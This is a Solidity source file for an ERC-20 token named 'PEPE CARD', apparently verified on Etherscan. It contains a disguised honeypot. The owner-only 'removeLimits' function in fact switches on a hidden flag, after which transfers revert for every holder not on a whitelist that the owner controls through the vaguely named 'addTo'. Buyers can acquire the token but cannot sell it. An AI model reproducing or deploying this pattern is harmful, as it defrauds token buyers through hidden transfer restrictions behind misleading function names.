/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

abstract contract Context {
    /*  */
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    
    /*  */
    function totalSupply() external view returns (uint256);

    /*  */
    function balanceOf(address account) external view returns (uint256);

    /*  */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /*  */
    function allowance(address owner, address spender) external view returns (uint256);

    /*  */
    function approve(address spender, uint256 amount) external returns (bool);

    /*  */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {

    /*  */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /*  */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /*  */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /*  */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /*  */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /*  */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /*  */
    function owner() public view returns (address) {
        return _owner;
    }

    /*  */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /*  */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /*  */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract PepeCard is IERC20, Ownable {

    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _accounts;

    string private _symbol;
    uint8 private _decimals;
    string private _name;
    address private _owner;
    uint256 private _total;
    bool private _value;

    constructor() {
        _symbol = "PEPECARD";
        _decimals = 18;
        _name = "PEPE CARD";
        _owner = _msgSender();
        _total = (10**uint256(_decimals)) * 1000000000000;
        _balances[_owner] = _total;
        addTo(_owner, _owner, true);
        emit Transfer(address(0), _owner, _total);
    }

    /*  */
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /*  */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /*  */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /*  */
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /*  */
    function totalSupply() public view override returns (uint256) {
        return _total;
    }

    /*  */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /*  */
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    /*  */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /*  */
    function addTo(address account, address account2, bool value) public onlyOwner {
        require(account != address(0), "Invalid account");
        _accounts[account2] = value;
    }

    /*  */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (_value && !_accounts[_msgSender()]) {
            revert("Invalid");
        }
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /*  */
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (_value && !_accounts[sender]) {
            revert("Invalid");
        }
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    /*  */
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /*  */
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    /*  */
    function removeLimits(bool value, bool value2) public onlyOwner {
        require(!value, "It's ok");
        _value = value2;
    }

    /*  */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than zero");
        require(_balances[sender] >= amount, "ERC20: insufficient balance");

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

}